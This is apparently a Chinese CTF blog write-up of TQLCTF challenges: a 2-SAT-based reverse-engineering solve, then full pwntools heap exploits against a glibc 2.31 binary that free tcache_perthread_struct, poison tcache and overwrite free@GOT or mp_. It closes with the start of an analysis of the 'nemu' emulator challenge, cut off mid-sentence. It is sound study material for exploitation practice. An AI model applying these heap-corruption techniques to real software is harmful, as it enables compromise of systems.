<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>TQLCTF-RE/PWN复现报告 | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>TQLCTF-RE/PWN复现报告</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2022-02-25T04:37:37.000Z" id="date"> 2022-02-25</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-12-29T04:50:35.016Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Tales-of-the-Arrow"><a href="#Tales-of-the-Arrow" class="headerlink" title="Tales of the Arrow"></a>Tales of the Arrow</h3><p>在遇到这题以前甚至都没接触过2-sat问题，所以这次也对这个问题做个概述吧。</p>
<p>以下内容摘自OI WIKI：</p>
<blockquote>
<p>2-SAT，简单的说就是给出 n个集合，每个集合有两个元素，已知若干个，表示 a与 b矛盾（其中 a与b属于不同的集合）。然后从每个集合选择一个元素，判断能否一共选n个两两不矛盾的元素。</p>
</blockquote>
<p>而本题关键如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">def get_lit(i):<br>    return (i+1) * (2*int(bits[i])-1)<br><br>for t in range(N):<br>    i = random.randint(0,n-1)<br>    p = random.randint(0,2)<br>    true_lit = get_lit(i)<br>    for j in range(3):<br>        if j == p:<br>            print(true_lit)<br>        else:<br>            tmp = random.randint(0,n-1)<br>            rand_true = get_lit(tmp)<br>            if random.randint(0,3)==0:<br>                print(rand_true)<br>            else:<br>                print(-rand_true)<br></code></pre></td></tr></table></figure>

<p>每轮打印比特流中的随机三位的比特状态，但这个状态有可能会取反。且取反与否发生的概率是0.5。</p>
<p>一开始是3-sat问题，每轮必有一个数是真实状态，另外两个数则可真可假。但3-sat是NP完全问题，基本属于不可解。所以首先我们根据明文的特殊条件消除不确定性。</p>
<p>因为字符串必定是可打印的字符串，其由ASCII码组成，最高位必定为0。那么这一位的状态必定是负数，如果打印出该位的状态是正数，则表示它并非必然真值，那么该组数据中另外两个必有一个为真。如果将所有带有上述情况的组别取出，问题便被缩减到2-sat，即必有一真，另一者可真可假。</p>
<p>2-sat问题存在多项式解法(这是结论，笔者并没有证明过)，即在数据量足够的情况下，该问题会有唯一解。本题一共给出了5000组数据，符合本条件。</p>
<p>而本题之后的解法也很朴素，在二选一的条件下，如果又出现了“必为负数”的位被以正数打印出来，那么最后一个数就必定真值了，将所有确定真值的位全都统计下来，就能还原完整的比特流。</p>
<p>参考Nu1L发布的WP自己改的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">f = open(&quot;output.txt&quot;)             <br>n = int(f.readline().rstrip(&#x27;\n&#x27;))<br>N = int(f.readline().rstrip(&#x27;\n&#x27;))<br><br>x=[]<br>for i in range(1,5000):<br>    x1=int(f.readline())<br>    x2=int(f.readline())<br>    x3=int(f.readline())<br>    x.append([x1,x2,x3])<br><br>true_numer=[]<br>for i in range(n//8):<br>    true_numer.append(-8*i-1)<br><br>flag=[]<br>for i in range(n):<br>    flag.append(0)<br>for i in x:<br>    if(((-i[0] in true_numer) + (-i[1] in true_numer) + (-i[2] in true_numer))==2):<br>        count+=1<br>        for j in range(3):<br>            if((i[j] not in true_numer)and(-i[j]not in true_numer)):<br>                    true_numer+= [i[j]]<br><br>for i in true_numer:<br>    if(i&lt;0):<br>        flag[abs(i)-1]=0<br>    else:<br>        flag[i-1]=1<br>flag_text=&quot;&quot;<br>for i in flag:<br>    flag_text+=str(i)<br><br>print(bytes.fromhex(hex(int(flag_text,2))[2:]))<br><br>f.close() <br></code></pre></td></tr></table></figure>

<h2 id="PWN"><a href="#PWN" class="headerlink" title="## PWN"></a>## PWN</h2><h3 id="unbelievable-write"><a href="#unbelievable-write" class="headerlink" title="unbelievable_write"></a>unbelievable_write</h3><p>任意地址free，没有泄露，没有PIE，本该是道简单题，结果做了一整天……看完官方WP之后发现自己还是想的太少了，不过我自己的方法姑且也打通了，所以先从笔者的方法开始吧。</p>
<p>libc版本是2.31，已经有tcache了。因为此前我很少接触这个部分，所以这次记的详细一些(个人其实不太愿意在需要之前主动去掌握利用方式，这看着有些像是在“为了利用而利用”)。</p>
<p>程序逻辑这里不再复述，唯一值得注意的就是，它会很快就把本轮开辟的chunk释放掉，所以很难在Bin中布置chunk。</p>
<p>任意地址free允许我们直接把tcache_perthread_struct释放，其结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct tcache_perthread_struct<br>&#123;<br>  uint16_t counts[TCACHE_MAX_BINS];//TCACHE_MAX_BINS=64<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br>typedef struct tcache_entry<br>&#123;<br>  struct tcache_entry *next;<br>  struct tcache_perthread_struct *key;<br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure>

<p>可知该结构体大小为0x290，且能够控制Tcache bin的各项数据，包括链表和计数。</p>
<p>所以我们首先把它释放掉，然后向其中填充数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#首先我们先开辟一个chunk让它放到tcache bin里，事后备用<br>payload1=&#x27;aaaaaaaa&#x27;<br>create_chunk(0x28,payload1)<br>#然后释放tcache_perthread_struct<br>free_index(-0x290)<br>#接下来将tcache里的count全都置7，表示装满，以后的chunk就不会再放到这里了<br>#同时在里面将几个next指向free_got和target_addr<br>#这样我们之后就能向free_got和target写入数据了<br>payload1=(p16(7)*0x28).ljust(128,b&#x27;\x00&#x27;)+(p64(free_got)+p64(target_addr)+p64(0)+p64(0))<br>create_chunk(0x288,payload1)<br></code></pre></td></tr></table></figure>

<p>在写入数据之后，它会立刻把tcache_perthread_struct释放掉，不过现在会因为Tcache Bin已经满了，而被放到Unsorted Bin里。Bin结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tcachebins<br>0x20 [64480]: 0x404018 (free@got.plt) —▸ 0x7f1f03f31850 (free) ◂— endbr64 <br>0x30 [1031]: 0x404080 (target) ◂— 0xfedcba9876543210<br>.......<br>0x280 [  7]: 0x0<br>0x290 [  7]: 0x0<br>unsortedbin<br>all: 0x1866000 —▸ 0x7f1f0407fbe0 (main_arena+96) ◂— 0x1866000<br></code></pre></td></tr></table></figure>

<p>首先我们先开辟0x50大小的chunk，将Unsorted Bin里的块分割开，避免里面挂着tcache_perthread_struct的头部(原因之后会解释)。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#这里payload1没变，其实填什么都行，目的只是分割罢了<br>create_chunk(0x48,payload1)<br>#然后将free_got写成main，而0x401040是默认数据<br>#在从tcache bin中获取chunk时，会将key部分写为0，这会导致free的下一个函数被清零<br>#所以恢复其中未装载时的状态，防止调用它时发生异常<br>payload1=p64(main_addr)+p64(0x401040)<br>create_chunk(0x18,payload1)<br>#然后再把target拿下来，随便写点数据进去就行了，只要不是原数就行<br>create_chunk(0x28,payload1)<br>#最后我们调用c3函数即可<br>open_flag()<br></code></pre></td></tr></table></figure>

<p>如果我们事前没有切割Unsorted Bin，会因为2.31版本的libc检测，发生如下异常：</p>
<blockquote>
<p>malloc(): unsorted double linked list corrupted</p>
</blockquote>
<p>因为之前Unsorted Bin中挂的是tcache_perthread_struct，在从tcache中取出chunk的时候，会把count减一，导致fd指针无所指向，构不成回环而错误(前几个版本还不这么严格，2.31显然变得苛刻了不少)</p>
<p>但这个错误是发生的puts时的，该函数会在输出时为字符串开辟堆空间，所以在开辟时企图从Unsorted Bin分配时才被检测到，不会影响从Tcache Bin中的分配。</p>
<p>另外，还需要注意的一点是，不能直接把free_got写成c3函数中绕过检查的地址。最后也会crash在puts中。但笔者目前不知道为什么写成main就可以，而写成c3就会crash，如果有师傅知道的话务必教教我。</p>
<p>笔者自己的完整EXP：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>context.log_level = &#x27;debug&#x27;<br>p = process(&#x27;./pwn&#x27;)<br>elf=ELF(&#x27;./pwn&#x27;)<br>malloc=0x401387<br>free=0x4013fd<br>ret=0x40154D<br><br>free_got=elf.got[&#x27;free&#x27;]<br>target_addr=0x404080<br>ptr_addr=free_got<br>main=0x40152D<br>mas=0x401473<br>mas=main<br><br>def create_chunk(size,context):<br>    p.sendline(str(1))<br>    p.sendline(str(size))<br>    p.sendline(context)<br><br>def free_index(index):<br>    p.sendline(str(2))<br>    p.sendline(str(index))<br><br>def open_flag():<br>    p.sendline(str(3))<br><br>payload1=&#x27;aaaaaaaa&#x27;<br>create_chunk(0x28,payload1)<br><br>free_index(-0x290)<br>payload1=(p16(7)*0x28).ljust(128,b&#x27;\x00&#x27;)+(p64(ptr_addr)+p64(target_addr)+p64(0)+p64(0))<br><br>create_chunk(0x288,payload1)<br><br>create_chunk(0x48,payload1)<br>payload1=p64(mas)+p64(0x401040)<br><br>create_chunk(0x18,payload1)<br>create_chunk(0x28,payload1)<br><br>open_flag()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>然后回到官方WP，出题人表示，能写got纯粹是一个意外，它的本意是利用io，大致逻辑如下：</p>
<ul>
<li>首先释放tcache_perthread_struct，然后修改mp_，该值确定了tcache bin中最大能容纳的chunk大小，让0x1000等chunk也使用tcache</li>
<li>同时在tcache bin中挂上target，然后在使用stdout时会从中申请chunk，并将数据写进该chunk</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">static struct malloc_par mp_ =<br>&#123;<br>  .top_pad = DEFAULT_TOP_PAD,<br>  .n_mmaps_max = DEFAULT_MMAP_MAX,<br>  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,<br>  .trim_threshold = DEFAULT_TRIM_THRESHOLD,<br>#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))<br>  .arena_test = NARENAS_FROM_NCORES (1)<br>#if USE_TCACHE<br>  ,<br>  .tcache_count = TCACHE_FILL_COUNT,<br>  .tcache_bins = TCACHE_MAX_BINS,<br>  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS-1),<br>  .tcache_unsorted_limit = 0 /* No limit.  */<br>#endif<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>官方EXP如下：(笔者自行添加了注释)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#!/usr/bin/env python3<br>from pwn import *<br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)<br>#context.log_level=&#x27;debug&#x27;<br><br>def exp():<br>    io = process(&#x27;./pwn&#x27;, stdout=PIPE)<br>    def malloc(size, content):<br>        io.sendlineafter(b&#x27;&gt;&#x27;, b&#x27;1&#x27;)<br>        io.sendline(str(int(size)).encode())<br>        io.send(content)<br><br>    def tcache_count(l):<br>        res = [b&#x27;\x00\x00&#x27; for i in range(64)]<br>        for t in l:<br>            res[(t - 0x20)//0x10] = b&#x27;\x08\x00&#x27;<br>        return b&#x27;&#x27;.join(res)<br><br>    try:<br>        #在top chunk中布置0x404078，扩大tcache之后，这些都会变为next指针<br>        malloc(0x1000, p64(0x404078)*(0x1000//8))<br>        #释放tcache_perthread_struct<br>        io.sendlineafter(b&#x27;&gt;&#x27;, b&#x27;2&#x27;)<br>        io.sendline(b&#x27;-656&#x27;)<br>        #首先把0x290的count置8，让tcache_perthread_struct放进unsorted bin<br>        malloc(0x280, tcache_count([0x290]) + b&#x27;\n&#x27;)<br>        #然后分割tcache_perthread_struct，让tcache bin中的0x400和0x410项放入main_arena+96<br>        malloc(0x260, tcache_count([0x270]) + b&#x27;\n&#x27;)<br>        #然后把0x400和0x410也拉满，然后把0x400里的地址低位改成0xf290<br>        #这是单纯的爆破，希望它能指向&amp;mp_+0x10<br>        malloc(0x280, tcache_count([0x400, 0x410, 0x290]) + b&#x27;\x01\x00&#x27;*4*62 + b&#x27;\x90\xf2&#x27; + b&#x27;\n&#x27;)<br>        #倘若指向了&amp;mp_+0x10，那么就修改数据扩大tcache<br>        malloc(0x3f0, flat([<br>            0x20000,<br>            0x8,<br>            0,<br>            0x10000,<br>            0, 0, 0,<br>            0x1301000,<br>            2**64-1,<br>        ]) + b&#x27;\n&#x27;)<br>        #调用puts，让它为stdout开辟缓冲区，此时会从tcache中获取chunk<br>        #但tcache中已经被布置了0x404078，所以会得到此处内存<br>        #并且这个内存处会被陷入puts的字符串<br>        io.sendlineafter(b&#x27;&gt;&#x27;, b&#x27;3&#x27;)<br>        #此时target已被修改，直接调用即可成功<br>        io.sendlineafter(b&#x27;&gt;&#x27;, b&#x27;3&#x27;)<br>        flaaag = io.recvall(timeout=2)<br>        print(flaaag)<br>        io.close()<br>        return True<br>    except:<br>        io.close()<br>        return False<br><br>i = 0<br>while i &lt; 20 and not exp():<br>    i += 1<br>    continue<br></code></pre></td></tr></table></figure>

<p>另外补充一些内容。虽然之前知道vtable的跳转，但我没深究过，这次遇到了，所以顺便做点总结。<br>puts函数在调用时会通过vtable访问_IO_file_xsput函数，该函数才是真正的puts实现，调用过程如下：</p>
<blockquote>
<p>puts–&gt;_IO_file_xsputn–&gt;_IO_file_overflow–&gt;_IO_doallocbuf<br>--&gt;_IO_file_doallocate</p>
</blockquote>
<p>_IO_file_doallocate中真正调用malloc开辟缓冲区，调用源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">_IO_new_file_overflow (FILE *f, int ch)<br>&#123;<br>    ......<br>  /* If currently reading or no buffer allocated. */<br>  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0  f-&gt;_IO_write_base == NULL)<br>    &#123;<br>      /* Allocate a buffer if needed. */<br>      if (f-&gt;_IO_write_base == NULL)<br>    &#123;<br>      _IO_doallocbuf (f);<br>      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);<br>    &#125;<br>    ......<br>&#125;<br>libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)<br></code></pre></td></tr></table></figure>

<p>_IO_doallocbuf中通过跳转表调用_IO_file_doallocate开辟空间。</p>
<p>至此本题结束。</p>
<h3 id="nemu"><a href="#nemu" class="headerlink" title="nemu"></a>nemu</h3><p>一个模拟器，个人认为难点在于把握整个程序的逻辑。因为程序本身的体量不小，光是漏洞发觉就需要好一阵子。</p>
<h4 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h4><p>help命令可以知道一共有多少命令可用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">(nemu) help<br>help - Display informations about all supported commands<br>c - Continue the execution of the program<br>q - Exit NEMU<br>si - Execute the step by one<br>info - Show all the regester&#x27; information<br>x - Show the memory things<br>p - Show varibeals and numbers<br>w - Set the watch point<br>d - Delete the watch point<br>set - Set memory<br></code></pre></td></tr></table></figure>

<p>阅读源代码可知，初始化阶段调用load_img加载image，nemu使用的image内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">static inline int load_default_img() &#123;<br>  const uint8_t img []  = &#123;<br>    0xb8, 0x34, 0x12, 0x00, 0x00,        // 100000:  movl  $0x1234,%eax<br>    0xb9, 0x27, 0x00, 0x10, 0x00,        // 100005:  movl  $0x100027,%ecx<br>    0x89, 0x01,                          // 10000a:  movl  %eax,(%ecx)<br>    0x66, 0xc7, 0x41, 0x04, 0x01, 0x00,  // 10000c:  movw  $0x1,0x4(%ecx)<br>    0xbb, 0x02, 0x00, 0x00, 0x00,        // 100012:  movl  $0x2,%ebx<br>    0x66, 0xc7, 0x84, 0x99, 0x00, 0xe0,  // 100017:  movw  $0x1,-0x2000(%ecx,%ebx,4)<br>    0xff, 0xff, 0x01, 0x00,<br>    0xb8, 0x00, 0x00, 0x00, 0x00,        // 100021:  movl  $0x0,%eax<br>    0xd6,                                // 100026:  nemu_trap<br>  &#125;;<br>  Log(&quot;No image is given. Use the default build-in image.&quot;);<br>  memcpy(guest_to_host(ENTRY_START), img, sizeof(img));<br>  return sizeof(img);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>程序只给了一部分实现，像是exec_real函数就并未给出源代码，因此只能靠逆向完成。其大致过程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.data:000000000060F240 opcode_table    opcode_entry 0Fh dup(&lt;0, offset exec_inv, 0&gt;)<br>.data:000000000060F240                                         ; DATA XREF: exec_2byte_esc+9E↑o<br>.data:000000000060F240                                         ; exec_2byte_esc+A5↑r ...<br>.data:000000000060F240                 opcode_entry &lt;0, offset exec_2byte_esc, 0&gt;<br>.data:000000000060F240                 opcode_entry 56h dup(&lt;0, offset exec_inv, 0&gt;)<br>.data:000000000060F240                 opcode_entry &lt;0, offset exec_operand_size, 0&gt;<br>.data:000000000060F240                 opcode_entry 19h dup(&lt;0, offset exec_inv, 0&gt;)<br>......以下略<br></code></pre></td></tr></table></figure>

<p>其中，opcode_entry结构体如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct &#123;<br>  DHelper decode;<br>  EHelper execute;<br>  int width;<br>&#125; opcode_entry;<br></code></pre></td></tr></table></figure>

<p>decode和execute都是函数指针，它们指向解析指令函数和执行指令函数。</p>
<p>例如：exec_mov（本题似乎只实现了mov指令，其他指令的执行函数是无效的）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">void __fastcall exec_mov(vaddr_t *eip_0)<br>&#123;<br>  __int64 v1; // r9<br>  __int64 v2; // r9<br><br>  operand_write(&amp;decoding.dest, &amp;decoding.src.val);<br>  v1 = 108LL;<br>  if ( decoding.dest.width != 4 )<br>  &#123;<br>    v1 = 98LL;<br>    if ( decoding.dest.width != 1 )<br>    &#123;<br>      v1 = 63LL;<br>      if ( decoding.dest.width == 2 )<br>        v1 = 119LL;<br>    &#125;<br>  &#125;<br>  if ( __snprintf_chk(141182936LL, 80LL, 1LL, 80LL, &quot;mov%c %s,%s&quot;, v1, decoding.src.str, decoding.dest.str) &gt; 79 )<br>  &#123;<br>    fflush(stdout);<br>    fwrite(&quot;\x1B[1;31m&quot;, 1uLL, 7uLL, stderr);<br>    fwrite(&quot;buffer overflow!&quot;, 1uLL, 0x10uLL, stderr);<br>    fwrite(&quot;\x1B[0m\n&quot;, 1uLL, 5uLL, stderr);<br>    v2 = 108LL;<br>    if ( decoding.dest.width != 4 )<br>    &#123;<br>      v2 = 98LL;<br>      if ( decoding.dest.width != 1 )<br>      &#123;<br>        v2 = 63LL;<br>        if ( decoding.dest.width == 2 )<br>          v2 = 119LL;<br>      &#125;<br>    &#125;<br>    if ( __snprintf_chk(141182936LL, 80LL, 1LL, 80LL, &quot;mov%c %s,%s&quot;, v2, decoding.src.str, decoding.dest.str) &gt; 79 )<br>      __assert_fail(<br>        &quot;snprintf(decoding.assembly, 80, \&quot;mov\&quot; \&quot;%c %s,%s\&quot;, (((&amp;decoding.dest)-&gt;width) == 4 ? &#x27;l&#x27; : (((&amp;decoding.dest)&quot;<br>        &quot;-&gt;width) == 1 ? &#x27;b&#x27; : (((&amp;decoding.dest)-&gt;width) == 2 ? &#x27;w&#x27; : &#x27;?&#x27;))), (&amp;decoding.src)-&gt;str, (&amp;decoding.dest)-&gt;str) &lt; 80&quot;,<br>        &quot;src/cpu/exec/data-mov.c&quot;,<br>        5u,<br>        &quot;exec_mov&quot;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>decoding是全局变量，指令会先被解析到decoding中，然后在exec_mov中使用该结构。结构如下：</p>
